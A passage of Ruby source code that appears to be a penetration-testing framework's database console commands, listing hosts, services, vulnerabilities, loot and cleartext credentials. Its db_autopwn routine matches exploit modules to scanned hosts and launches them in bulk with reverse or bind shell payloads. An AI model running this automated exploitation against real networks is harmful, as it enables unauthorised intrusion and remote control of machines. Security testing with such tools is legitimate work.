
require 'rexml/document'
require 'rex/parser/nmap_xml'
require 'msf/core/db_export'

module Msf
module Ui
module Console
module CommandDispatcher
class Db

		require 'tempfile'

		include Msf::Ui::Console::CommandDispatcher

		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
		PWN_SLNT = 2**5
		PWN_VERB = 2**6

		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			base = {
				"db_driver"     => "Specify a database driver",
				"db_connect"    => "Connect to an existing database",
				"db_disconnect" => "Disconnect from the current database instance",
				"db_status"     => "Show the current database status",
				# Deprecated
				"db_create"     => "Create a brand new database",
				"db_destroy"    => "Drop an existing database"
			}

			more = {
				"db_workspace"  => "Switch between database workspaces",
				"db_hosts"      => "List all hosts in the database",
				"db_services"   => "List all services in the database",
				"db_vulns"      => "List all vulnerabilities in the database",
				"db_notes"      => "List all notes in the database",
				"db_loot"       => "List all loot in the database",				
				"db_creds"      => "List all credentials in the database",
				"db_exploited"  => "List all exploited hosts in the database",
				"db_add_port"   => "Add a port to a host",
				"db_autopwn"    => "Automatically exploit everything",
				"db_import"     => "Import a scan result file (filetype will be auto-detected)",
				"db_export"     => "Export a file containing the contents of the database",
				"db_nmap"       => "Executes nmap and records the output automatically",
			}

			# Always include commands that only make sense when connected.
			# This avoids the problem of them disappearing unexpectedly if the
			# database dies or times out.  See #1923
			base.merge(more)
		end

		#
		# Returns true if the db is connected, prints an error and returns
		# false if not.
		#
		# All commands that require an active database should call this before
		# doing anything.
		#
		def active?
			if not framework.db.active
				print_error("Database not connected")
				return false
			end
			true
		end

		def cmd_db_workspace_help
			print_line "Usage:"
			print_line "    db_workspace                  List workspaces"
			print_line "    db_workspace [name]           Switch workspace"
			print_line "    db_workspace -a [name] ...    Add workspace(s)"
			print_line "    db_workspace -d [name] ...    Delete workspace(s)"
			print_line "    db_workspace -h               Show this help information"
			print_line
		end

		def cmd_db_workspace(*args)
			return unless active?
			while (arg = args.shift)
				case arg
				when '-h','--help'
					cmd_db_workspace_help
					return
				when '-a','--add'
					adding = true
				when '-d','--del'
					deleting = true
				else
					names ||= []
					names << arg
				end
			end

			if adding and names
				# Add workspaces
				workspace = nil
				names.each do |name|
					workspace = framework.db.add_workspace(name)
					print_status("Added workspace: #{workspace.name}")
				end
				framework.db.workspace = workspace
			elsif deleting and names
				# Delete workspaces
				names.each do |name|
					workspace = framework.db.find_workspace(name)
					if workspace.nil?
						print_error("Workspace not found: #{name}")
					elsif workspace.default?
						workspace.destroy
						workspace = framework.db.add_workspace(name)
						print_status("Deleted and recreated the default workspace")
					else
						# switch to the default workspace if we're about to delete the current one
						framework.db.workspace = framework.db.default_workspace if framework.db.workspace.name == workspace.name
						# now destroy the named workspace
						workspace.destroy
						print_status("Deleted workspace: #{name}")
					end
				end
			elsif names
				name = names.last
				# Switch workspace
				workspace = framework.db.find_workspace(name)
				if workspace
					framework.db.workspace = workspace
					print_status("Workspace: #{workspace.name}")
				else
					print_error("Workspace not found: #{name}")
					return
				end
			else
				# List workspaces
				framework.db.workspaces.each do |s|
					pad = (s.name == framework.db.workspace.name) ? "* " : "  "
					print_line(pad + s.name)
				end
			end
		end

		def cmd_db_workspace_tabs(str, words)
			return [] unless active?
			framework.db.workspaces.map { |s| s.name } if (words & ['-a','--add']).empty?
		end

		def cmd_db_hosts_help
			# This command does some lookups for the list of appropriate column
			# names, so instead of putting all the usage stuff here like other
			# help methods, just use it's "-h" so we don't have to recreating
			# that list
			cmd_db_hosts("-h")
		end

		def cmd_db_hosts(*args)
			return unless active?
			onlyup = false
			host_search = nil
			set_rhosts = false
			hostlist = []
			mode = :search

			output = nil
			default_columns = ::Msf::DBManager::Host.column_names.sort
			virtual_columns = [ 'svcs', 'vulns', 'workspace' ]

			col_search = [ 'address', 'mac', 'name', 'os_name', 'os_flavor', 'os_sp', 'purpose', 'info', 'comments' ]			
						
			default_columns.delete_if {|v| (v[-2,2] == "id")}
			while (arg = args.shift)
				case arg
				when '-a','--add'
					mode = :add
				when '-d','--delete'
					mode = :delete
				when '-c'
					list = args.shift
					if(!list)
						print_error("Invalid column list")
						return
					end
					col_search = list.strip().split(",")
					col_search.each { |c|
						if not default_columns.include?(c) and not virtual_columns.include?(c)
							all_columns = default_columns + virtual_columns
							print_error("Invalid column list. Possible values are (#{all_columns.join("|")})")
							return
						end
					}
				when '-u','--up'
					onlyup = true
				when '-o'
					output = args.shift
				when '-R','--rhosts'
					set_rhosts = true
					rhosts = []

				when '-h','--help'
					print_line "Usage: db_hosts [ options ] [addr1 addr2 ...]"
					print_line
					print_line "OPTIONS:"
					print_line "  -a,--add          Add the hosts instead of searching"
					print_line "  -d,--delete       Delete the hosts instead of searching"
					print_line "  -c <col1,col2>    Only show the given columns (see list below)"
					print_line "  -h,--help         Show this help information"
					print_line "  -u,--up           Only show hosts which are up"
					print_line "  -o <file>         Send output to a file in csv format"
					print_line "  -R,--rhosts       Set RHOSTS from the results of the search"
					print_line
					print_line "Available columns: #{default_columns.join(", ")}"
					print_line
					return
				else
					hostlist.push(arg)
				end
			end

			# This will be used in a database lookup.  An empty array to search
			# for will return in an empty result; give nil when we want them
			# all.
			host_search = (hostlist.empty? ? nil : hostlist)

			if col_search
				col_names = col_search
			else
				col_names = default_columns + virtual_columns
			end

			case mode
			when :add
				hostlist.each do |address|
					host = framework.db.find_or_create_host(:host => address)
					print_status("Time: #{host.created_at} Host: host=#{host.address}")
					if set_rhosts
						# only unique addresses
						rhosts << host.address unless rhosts.include?(host.address)
					end
				end

			when :delete
				hostlist.each do |address|
					if framework.db.del_host(framework.db.workspace, address)
						print_status("Host #{address} deleted")
					end
				end

			when :search
				tbl = Rex::Ui::Text::Table.new(
					{
						'Header'  => "Hosts",
						'Columns' => col_names,
					})

				framework.db.hosts(framework.db.workspace, onlyup, host_search).each do |host|
					columns = col_names.map do |n|
						# Deal with the special cases
						if virtual_columns.include?(n)
							case n
							when "svcs";      host.services.length
							when "vulns";     host.vulns.length
							when "workspace"; host.workspace.name
							end
						# Otherwise, it's just an attribute
						else
							host.attributes[n] || ""
						end
					end

					tbl << columns
					if set_rhosts
						# only unique addresses
						rhosts << host.address unless rhosts.include?(host.address)
					end
				end
				if output
					print_status("Wrote hosts to #{output}")
					::File.open(output, "wb") { |ofd|
						ofd.write(tbl.to_csv)
					}
				else
					print_line
					print_line tbl.to_s
				end
			end

			# Finally, handle the case where the user wants the resulting list
			# of hosts to go into RHOSTS.
			set_rhosts_from_addrs(rhosts) if set_rhosts
		end

		def cmd_db_services_help
			# Like db_hosts, use "-h" instead of recreating the column list
			# here
			cmd_db_services("-h")
		end

		def cmd_db_services(*args)
			return unless active?
			mode = :search
			onlyup = false
			output_file = nil
			set_rhosts = nil
			host_search = nil
			port_search = nil
			proto_search = nil
			name_search = nil
			col_search = ['port', 'proto', 'name', 'state', 'info']
			default_columns = ::Msf::DBManager::Service.column_names.sort
			default_columns.delete_if {|v| (v[-2,2] == "id")}
			hostlist = []
			while (arg = args.shift)
				case arg
				when '-a','--add'
					mode = :add
				when '-d','--delete'
					mode = :delete
				when '-u','--up'
					onlyup = true
				when '-c'
					list = args.shift
					if(!list)
						print_error("Invalid column list")
						return
					end
					col_search = list.strip().split(",")
					col_search.each { |c|
						if not default_columns.include? c
							print_error("Invalid column list. Possible values are (#{default_columns.join("|")})")
							return
						end
					}
				when '-p'
					portlist = args.shift
					if (!portlist)
						print_error("Invalid port list")
						return
					end
					ports = portlist.strip().split(",")
				when '-r'
					proto = args.shift
					if (!proto)
						print_status("Invalid protocol")
						return
					end
					proto = proto.strip
				when '-n'
					namelist = args.shift
					if (!namelist)
						print_error("Invalid name list")
						return
					end
					names = namelist.strip().split(",")
				when '-o'
					output_file = args.shift
					if (!output_file)
						print_error("Invalid output filename")
						return
					end
					output_file = File.expand_path(output_file)
				when '-R','--rhosts'
					set_rhosts = true
					rhosts = []

				when '-h','--help'
					print_line
					print_line "Usage: db_services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-n <name1,name2>] [-o <filename>] [addr1 addr2 ...]"
					print_line
					#print_line "  -a,--add          Add the services instead of searching"
					print_line "  -d,--delete       Delete the services instead of searching"
					print_line "  -c <col1,col2>    Only show the given columns"
					print_line "  -h,--help         Show this help information"
					print_line "  -n <name1,name2>  Search for a list of service names"
					print_line "  -p <port1,port2>  Search for a list of ports"
					print_line "  -r <protocol>     Only show [tcp|udp] services"
					print_line "  -u,--up           Only show services which are up"
					print_line "  -o <file>         Send output to a file in csv format"
					print_line "  -R,--rhosts       Set RHOSTS from the results of the search"
					print_line
					print_line "Available columns: #{default_columns.join(", ")}"
					print_line
					return
				else
					hostlist << arg
				end
			end

			case mode
			when :add
				hostlist.each { |addr|
					# XXX: Can only deal with one port and one service name at
					# a time right now.  Them's the breaks.
					host = framework.db.find_or_create_host(:host => addr)
					next if not host
					info = {
						:host => host,
						:port => ports.first.to_i
					}
					info[:proto] = proto.downcase if proto
					info[:name]  = names.first.downcase if names and names.first

					svc = framework.db.find_or_create_service(info)
					print_status("Time: #{svc.created_at} Note: host=#{svc.host.address} port=#{svc.port} proto=#{svc.proto} name=#{svc.name}")
				}

			when :delete
				hostlist.each { |addr|
					host = framework.db.workspace.hosts.find_by_address(addr)
					next if not host
					svc = host.services.find_by_port_and_proto(port, proto||'tcp')
					next if not svc
					print_status("Time: #{svc.created_at} Note: host=#{svc.host.address} port=#{svc.port} proto=#{svc.proto} name=#{svc.name}")
					svc.destroy
				}

			when :search
				col_names = default_columns
				if col_search
					col_names = col_search
				end
				tbl = Rex::Ui::Text::Table.new({
						'Header'  => "Services",
						'Columns' => ['host'] + col_names,
					})
				# The user didn't give us any addresses to search for, so
				# switch to nil so ActiveRecord will return all of them.
				if hostlist.empty?
					hostlist = nil
				end

				framework.db.services(framework.db.workspace, onlyup, proto, hostlist, ports, names).each do |service|
					host = service.host
					columns = [host.address] + col_names.map { |n| service[n].to_s || "" }
					tbl << columns
					if set_rhosts
						# only unique addresses
						rhosts << host.address unless rhosts.include?(host.address)
					end
				end
				print_line
				if (output_file == nil)
					print_line tbl.to_s
				else
					# create the output file
					File.open(output_file, "wb") { |f| f.write(tbl.to_csv) }
					print_status("Wrote services to #{output_file}")
				end
			end

			# Finally, handle the case where the user wants the resulting list
			# of hosts to go into RHOSTS.
			set_rhosts_from_addrs(rhosts) if set_rhosts

		end


		def cmd_db_vulns_help
			print_line "Usage: db_vulns"
			print_line
			print_line "Print all vulnerabilities in the database"
			print_line
		end


		def cmd_db_vulns(*args)
			return unless active?
			framework.db.each_vuln(framework.db.workspace) do |vuln|
				reflist = vuln.refs.map { |r| r.name }
				if(vuln.service)
					print_status("Time: #{vuln.created_at} Vuln: host=#{vuln.host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}")
				else
					print_status("Time: #{vuln.created_at} Vuln: host=#{vuln.host.address} name=#{vuln.name} refs=#{reflist.join(',')}")
				end
			end
		end

		def cmd_db_creds_help
			print_line "Usage: db_creds [addr range]"
			print_line "Usage: db_creds -a <addr range> -p <port> -t <type> -u <user> -P <pass>"
			print_line
			print_line "  -a,--add              Add creds to the given addresses instead of listing"
			print_line "  -d,--delete           Delete the creds instead of searching"
			print_line "  -h,--help             Show this help information"
			print_line "  -p,--port <portspec>  List creds matching this port spec"
			print_line "  -s <svc names>        List creds matching these service names"
			print_line "  -t,--type <type>      Add a cred of this type (only with -a). Default: password"
			print_line "  -u,--user      Add a cred for this user (only with -a). Default: blank"
			print_line "  -P,--password  Add a cred with this password (only with -a). Default: blank"
			print_line
			print_line "Examples:"
			print_line "  db_creds               # Default, returns all active credentials"
			print_line "  db_creds all           # Returns all credentials active or not"
			print_line "  db_creds 1.2.3.4/24    # nmap host specification"
			print_line "  db_creds -p 22-25,445  # nmap port specification"
			print_line "  db_creds 10.1.*.* -s ssh,smb all"
			print_line
		end

		#
		# Can return return active or all, on a certain host or range, on a
		# certain port or range, and/or on a service name.
		#
		def cmd_db_creds(*args)
			return unless active?

			search_param = nil
			inactive_ok = false
			type = "password"

			host_ranges = []
			port_ranges = []
			svcs        = []

			# Short-circuit help
			if args.delete "-h"
				cmd_db_creds_help
				return
			end

			mode = :search
			search_term = "host"
			while (arg = args.shift)
				case arg
				when "-a","--add"
					mode = :add
				when "-d"
					mode = :delete
				when "-h"
					cmd_db_creds_help
					return
				when "-p","--port"
					port = args.shift
					if (!port)
						print_error("Argument required for -p")
						return
					end
					begin
						port_ranges << Rex::Socket.portspec_to_portlist(port)
					rescue
						print_error "Invalid port parameter, #{port}."
						return
					end
				when "-t","--type"
					ptype = args.shift
					if (!ptype)
						print_error("Argument required for -t")
						return
					end
				when "-s","--service"
					service = args.shift
					if (!service)
						print_error("Argument required for -s")
						return
					end
					svcs = service.split(/[\s]*,[\s]*/)
				when "-P","--password"
					pass = args.shift
					if (!pass)
						print_error("Argument required for -P")
						return
					end
				when "-u","--user"
					user = args.shift
					if (!user)
						print_error("Argument required for -u")
						return
					end
				when "all"
					# The user wants inactive passwords, too
					inactive_ok = true
				else
					# Anything that wasn't an option is the thing to search for
					begin
						host_ranges << Rex::Socket::RangeWalker.new(arg)
					rescue
						print_error "Invalid host parameter, #{arg}."
						return
					end
				end
			end

			if mode == :add
				if port_ranges.length != 1 or port_ranges.first.length != 1
					print_error("Exactly one port required")
					return
				end
				port = port_ranges.first.first
				host_ranges.each do |range|
					range.each do |host|
						cred = framework.db.find_or_create_cred(
							:host => host,
							:port => port,
							:user => (user == "NULL" ? nil : user),
							:pass => (pass == "NULL" ? nil : pass),
							:ptype => ptype,
							:sname => service,
							:active => true
						)
						print_status("Time: #{cred.updated_at} Credential: host=#{cred.service.host.address} port=#{cred.service.port} proto=#{cred.service.proto} sname=#{cred.service.name} type=#{cred.ptype} user=#{cred.user} pass=#{cred.pass} active=#{cred.active}")
					end
				end
				return
			end

			# If we get here, we're searching.  Delete implies search

			creds_returned = 0
			# Now do the actual search
			framework.db.each_cred(framework.db.workspace) do |cred|
				# skip if it's inactive and user didn't ask for all
				next unless (cred.active or inactive_ok)

				# Also skip if the user is searching for something and this
				# one doesn't match
				includes = false
				host_ranges.map do |rw|
					includes = rw.include? cred.service.host.address
					break if includes
				end
				next unless host_ranges.empty? or includes

				# Same for ports
				ports = port_ranges.flatten
				next unless ports.empty? or ports.include? cred.service.port.to_s

				# Same for service names
				svcs.flatten!
				next unless svcs.empty? or svcs.include?(cred.service.name)

				print_status("Time: #{cred.updated_at} Credential: host=#{cred.service.host.address} port=#{cred.service.port} proto=#{cred.service.proto} sname=#{cred.service.name} type=#{cred.ptype} user=#{cred.user} pass=#{cred.pass} active=#{cred.active}")
				if mode == :delete
					cred.destroy
				end
				creds_returned += 1
			end
			print_status "Found #{creds_returned} credential#{creds_returned == 1 ? "" : "s"}."

		end

		# Returns exploited hosts. Takes a similiar set of options as db_creds
		def cmd_db_exploited(*args)
			return unless active?
			search_term = "host"
			search_param = nil
			inactive_ok = false

			# Short-circuit help
			if args.delete "-h"
				cmd_db_creds_help
				return
			end

			if args.delete "-p"
				search_term = "port"
			elsif args.delete "-s"
				search_term = "service"
			end

			# Does the user want inactive passwords, too?
			if args.delete "all"
				inactive_ok = true
			end

			# Anything that wasn't an option is the thing to search for
			search_param = args.shift

			# Set up the place we're searching before dropping into the search loop
			case search_term
			when "host"
				begin
					rw = Rex::Socket::RangeWalker.new(search_param)
				rescue
					print_error "Invalid host parameter."
					return
				end
			when "port"
				if search_param =~ /([0-9]+)-([0-9]+)/
					ports = Range.new($1,$2)
				else
					ports = Range.new(search_param,search_param)
				end
			when "service"
				svcs = search_param.split(/[\s]*,[\s]*/)
			end

			exploited_returned = 0
			framework.db.each_exploited_host(framework.db.workspace) do |eh|
				unless search_param.nil?
					next unless rw.include? eh.host.address
					next unless !eh.service or ports.include? eh.service.port.to_s
					next unless !eh.service or svcs.include? eh.service.name
				end

				if eh.service
					print_status("Time: #{eh.updated_at} Host Info: host=#{eh.host.address} port=#{eh.service.port} proto=#{eh.service.proto} sname=#{eh.service.name} exploit=#{eh.name}")
				else
					print_status("Time: #{eh.updated_at} Host Info: host=#{eh.host.address} exploit=#{eh.name}")
				end
				exploited_returned += 1
			end
			print_status "Found #{exploited_returned} exploited host#{exploited_returned == 1 ? "" : "s"}."
		end

		def cmd_db_notes_help
			print_line "Usage: db_notes [-h|--help] [-t <type1,type2>] [-n <data string>] [-a] [addr1 addr2 ...]"
			print_line
			print_line "  -a,--add          Add a note to the list of addresses, instead of listing"
			print_line "  -d,--delete       Delete the hosts instead of searching"
			print_line "  -n,--note <data>  Set the data for a new note (only with -a)"
			print_line "  -t <type1,type2>  Search for a list of types"
			print_line "  -h,--help         Show this help information"
			print_line "  -R,--rhosts       Set RHOSTS from the results of the search"
			print_line
			print_line "Examples:"
			print_line "  db_notes --add -t apps -n 'winzip' 10.1.1.34 10.1.20.41"
			print_line "  db_notes -t smb.fingerprint 10.1.1.34 10.1.20.41"
			print_line
		end

		def cmd_db_notes(*args)
			return unless active?
			mode = :search
			data = nil
			types = nil
			set_rhosts = false
			hostlist = []

			while (arg = args.shift)
				case arg
				when '-a','--add'
					mode = :add
				when '-d','--delete'
					mode = :delete
				when '-n','--note'
					data = args.shift
					if(!data)
						print_error("Can't make a note with no data")
						return
					end
				when '-t'
					typelist = args.shift
					if(!typelist)
						print_error("Invalid type list")
						return
					end
					types = typelist.strip().split(",")
				when '-R','--rhosts'
					set_rhosts = true
					rhosts = []
				when '-h','--help'
					cmd_db_notes_help
					return
				else
					hostlist << arg
				end

			end
			if hostlist.empty?
				hostlist = nil
			end

			case mode
			when :add
				if types.size != 1
					print_error("Only one type allowed when adding notes")
				end
				type = types.first
				hostlist.each { |addr|
					host = framework.db.find_or_create_host(:host => addr)
					break if not host
					note = framework.db.find_or_create_note(:host => host, :type => type, :data => data)
					break if not note
					print_status("Time: #{note.created_at} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
				}

			when :delete
				if types.size != 1
					print_error("Only one type allowed when deleting notes")
				end
				type = types.first
				hostlist.each { |addr|
					host = framework.db.workspace.hosts.find_by_address(addr)
					next if not host
					note = host.notes.find_by_ntype(type)
					next if not note
					print_status("Time: #{note.created_at} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
					note.destroy
				}

			when :search
				framework.db.each_note(framework.db.workspace) do |note|
					next if(hostlist and (note.host.nil? or hostlist.index(note.host.address).nil?))
					next if(types and types.index(note.ntype).nil?)
					msg = "Time: #{note.created_at} Note:"
					if (note.host)
						host = note.host
						msg << " host=#{note.host.address}"
						if set_rhosts
							# only unique addresses
							rhosts << host.address unless rhosts.include?(host.address)
						end
					end
					if (note.service)
						name = (note.service.name ? note.service.name : "#{note.service.port}/#{note.service.proto}")
						msg << " service=#{name}"
					end
					msg << " type=#{note.ntype} data=#{note.data.inspect}"
					print_status(msg)
				end
			end

			# Finally, handle the case where the user wants the resulting list
			# of hosts to go into RHOSTS.
			set_rhosts_from_addrs(rhosts) if set_rhosts
		end

		def cmd_db_loot_help
			print_line "Usage: db_loot [-h] [addr1 addr2 ...] [-t <type1,type2>]"
			print_line
			print_line "  -t <type1,type2>  Search for a list of types"
			print_line "  -h,--help         Show this help information"
			print_line
		end

		def cmd_db_loot(*args)
			return unless active?
			hostlist = []
			types = nil
			while (arg = args.shift)
				case arg
				when '-t'
					typelist = args.shift
					if(!typelist)
						print_status("Invalid type list")
						return
					end
					types = typelist.strip().split(",")
				when '-h','--help'
					cmd_db_loot_help
					return
				else
					hostlist << arg
				end

			end
			if hostlist.empty?
				hostlist = nil
			end
			framework.db.each_loot(framework.db.workspace) do |loot|
				next if(hostlist and (loot.host.nil? or hostlist.index(loot.host.address).nil?))
				next if(types and types.index(loot.ltype).nil?)
				msg = "Time: #{loot.created_at} Loot:"
				if (loot.host)
					msg << " host=#{loot.host.address}"
				end
				if (loot.service)
					name = (loot.service.name ? loot.service.name : "#{loot.service.port}/#{loot.service.proto}")
					msg << "service=#{name}"
				end				

				msg << " type=#{loot.ltype} name=#{loot.name} content=#{loot.content_type} info='#{loot.info}' path=#{loot.path}"
				print_status(msg)
			end
		end

		#
		# A shotgun approach to network-wide exploitation
		#
		def cmd_db_autopwn(*args)
			return unless active?

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			mjob  = 5
			regx  = nil
			minrank = nil
			maxtime = 120

			port_inc = []
			port_exc = []

			targ_inc = []
			targ_exc = []

			args.push("-h") if args.length == 0

			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING
				when '-q'
					mode |= PWN_SLNT
				when '-v'
					mode |= PWN_VERB
				when '-j'
					mjob = args.shift.to_i
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					tmpopt = OptAddressRange.new('TEMPRANGE', [ true, '' ])
					range = args.shift
					if not tmpopt.valid?(range)
						print_error("Invalid range for -I")
						return
					end
					targ_inc << Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
				when '-X'
					tmpopt = OptAddressRange.new('TEMPRANGE', [ true, '' ])
					range = args.shift
					if not tmpopt.valid?(range)
						print_error("Invalid range for -X")
						return
					end
					targ_exc << Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
				when '-PI'
					port_inc = Rex::Socket.portspec_to_portlist(args.shift)
				when '-PX'
					port_exc = Rex::Socket.portspec_to_portlist(args.shift)
				when '-m'
					regx = args.shift
				when '-R'
					minrank = args.shift
				when '-T'
					maxtime = args.shift.to_f
				when '-h','--help'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h          Display this help text")
					print_line("\t-t          Show all matching exploit modules")
					print_line("\t-x          Select modules based on vulnerability references")
					print_line("\t-p          Select modules based on open ports")
					print_line("\t-e          Launch exploits against all matched targets")
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r          Use a reverse connect shell")
					print_line("\t-b          Use a bind shell on a random port (default)")
					print_line("\t-q          Disable exploit module output")
					print_line("\t-R  [rank]  Only run modules with a minimal rank")
					print_line("\t-I  [range] Only exploit hosts inside this range")
					print_line("\t-X  [range] Always exclude hosts inside this range")
					print_line("\t-PI [range] Only exploit hosts with these ports open")
					print_line("\t-PX [range] Always exclude hosts with these ports open")
					print_line("\t-m  [regex] Only run modules whose name matches the regex")
					print_line("\t-T  [secs]  Maximum runtime for any exploit in seconds")
					print_line("")
					return
				end
			end

			minrank = minrank || framework.datastore['MinimumRank'] || 'manual'
			if ! RankingName.values.include?(minrank)
				print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
				wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
				return
			else
				minrank = RankingName.invert[minrank]
			end

			# Default to quiet mode
			if (mode & PWN_VERB == 0)
				mode |= PWN_SLNT
			end

			matches    = {}
			refmatches = {}

			# Pre-allocate a list of references and ports for all exploits
			mrefs  = {}
			mports = {}
			mservs = {}

			# A list of jobs we spawned and need to wait for
			autopwn_jobs = []

			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|
				mtype[0].each_module do |modname, mod|
					o = mod.new

					if(mode & PWN_XREF != 0)
						o.references.each do |r|
							next if r.ctx_id == 'URL'
							ref = r.ctx_id + "-" + r.ctx_val
							ref.upcase!

							mrefs[ref] ||= {}
							mrefs[ref][o.fullname] = o
						end
					end

					if(mode & PWN_PORT != 0)
						if(o.datastore['RPORT'])
							rport = o.datastore['RPORT']
							mports[rport.to_i] ||= {}
							mports[rport.to_i][o.fullname] = o
						end

						if(o.respond_to?('autofilter_ports'))
							o.autofilter_ports.each do |rport|
								mports[rport.to_i] ||= {}
								mports[rport.to_i][o.fullname] = o
							end
						end

						if(o.respond_to?('autofilter_services'))
							o.autofilter_services.each do |serv|
								mservs[serv] ||= {}
								mservs[serv][o.fullname] = o
							end
						end
					end
				end
			end


			begin

			framework.db.hosts.each do |host|
				xhost = host.address
				next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
				next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

				if(mode & PWN_VERB != 0)
					print_status("Scanning #{xhost} for matching exploit modules...")
				end

				#
				# Match based on vulnerability references
				#
				if (mode & PWN_XREF != 0)

					host.vulns.each do |vuln|

						# Faster to handle these here
						serv = vuln.service
						xport = xprot = nil

						if(serv)
							xport = serv.port
							xprot = serv.proto
						end

						vuln.refs.each do |ref|
							mods = mrefs[ref.name.upcase] || {}
							mods.each_key do |modname|
								mod = mods[modname]
								next if minrank and minrank > mod.rank
								next if (regx and mod.fullname !~ /#{regx}/)

								if(xport)
									next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
									next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								else
									if(mod.datastore['RPORT'])
										next if (port_inc.length > 0 and not port_inc.include?(mod.datastore['RPORT'].to_i))
										next if (port_exc.length > 0 and port_exc.include?(mod.datastore['RPORT'].to_i))
									end
								end

								next if (regx and e.fullname !~ /#{regx}/)

								mod.datastore['RPORT'] = xport if xport
								mod.datastore['RHOST'] = xhost

								filtered = false
								begin
									::Timeout.timeout(2, ::RuntimeError) do
										filtered = true if not mod.autofilter()
									end
								rescue ::Interrupt
									raise $!
								rescue ::Timeout::Error
									filtered = true
								rescue ::Exception
									filtered = true
								end
								next if filtered

								matches[[xport,xprot,xhost,mod.fullname]]=true
								refmatches[[xport,xprot,xhost,mod.fullname]] ||= []
								refmatches[[xport,xprot,xhost,mod.fullname]] << ref.name
							end
						end
					end
				end

				#
				# Match based on open ports
				#
				if (mode & PWN_PORT != 0)
					host.services.each do |serv|
						next if not serv.host
						next if (serv.state != ServiceState::Open)

						xport = serv.port.to_i
						xprot = serv.proto
						xname = serv.name

						next if xport == 0

						next if (port_inc.length > 0 and not port_inc.include?(xport))
						next if (port_exc.length > 0 and port_exc.include?(xport))

						mods = mports[xport.to_i] || {}

						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end

						mods = mservs[xname] || {}
						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end
					end
				end
			end

			rescue ::Exception => e
				print_status("ERROR: #{e.class} #{e} #{e.backtrace}")
				return
			end

			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)")
				print_status("")
				print_status("=" * 80)
				print_status(" " * 28 + "Matching Exploit Modules")
				print_status("=" * 80)

				matches.each_key do |xref|
					mod = nil
					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						tport = xref[0] || mod.datastore['RPORT']
						if(refmatches[xref])
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(", ")})")
						else
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (port match)")
						end
					end

				end
				print_status("=" * 80)
				print_status("")
				print_status("")
			end

			ilog("db_autopwn: Matched #{matches.length} modules")

			idx = 0
			matches.each_key do |xref|

				idx += 1

				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]

						if(xref[0])
							mod.datastore['RPORT'] = xref[0].to_s
						end

						if (code == :bind)
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							end
						end

						if (code == :conn)
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s

							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end

							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							end
						end


						if(framework.jobs.keys.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(framework.jobs.keys.length >= mjob)
								::IO.select(nil, nil, nil, 0.25)
							end
						end

						print_status("(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")

